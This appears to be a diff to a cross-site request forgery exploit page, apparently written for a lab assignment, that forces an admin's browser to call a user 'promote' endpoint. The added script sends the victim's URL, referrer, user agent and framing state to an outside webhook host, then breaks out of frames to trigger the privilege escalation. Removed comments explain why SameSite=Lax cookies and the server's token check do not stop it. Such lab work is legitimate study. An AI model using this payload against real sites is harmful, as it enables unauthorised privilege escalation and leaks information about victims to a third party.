@@ -2,12 +2,21 @@
 <html>
 <head><meta charset="utf-8"></head>
 <body>
-<!-- C1: force a TOP-LEVEL GET navigation to the promote endpoint.
-     SameSite=Lax still attaches the admin's sid cookie to top-level GETs,
-     and the server's token defense covers JSON POST routes only. -->
-<form id="f" method="GET" action="https://10.20.18.55:2070/labs/assignment03/environment/1/api/users/20211381/promote"></form>
 <script>
-  location.replace('https://10.20.18.55:2070/labs/assignment03/environment/1/api/users/20211381/promote');
+var W = 'https://golden-sparrow-81.webhook.cool';
+var ctx = {href: location.href, framed: (window.top !== window), ref: document.referrer, ua: navigator.userAgent};
+var qs = '?ctx=' + encodeURIComponent(JSON.stringify(ctx));
+try { new Image().src = W + '/beacon-img' + qs; } catch(e) {}
+try { fetch(W + '/beacon-fetch' + qs).catch(function(){}); } catch(e) {}
+
+var TARGET = 'https://10.20.18.55:2070/labs/assignment03/environment/1/api/users/20211381/promote';
+if (window.top !== window) {
+  // loaded in a frame: break out via a top-level navigation
+  try { top.location = TARGET; }
+  catch(e) { try { new Image().src = W + '/topfail?e=' + encodeURIComponent(String(e)); } catch(x) {} }
+} else {
+  location.replace(TARGET);
+}
 </script>
 </body>
 </html>
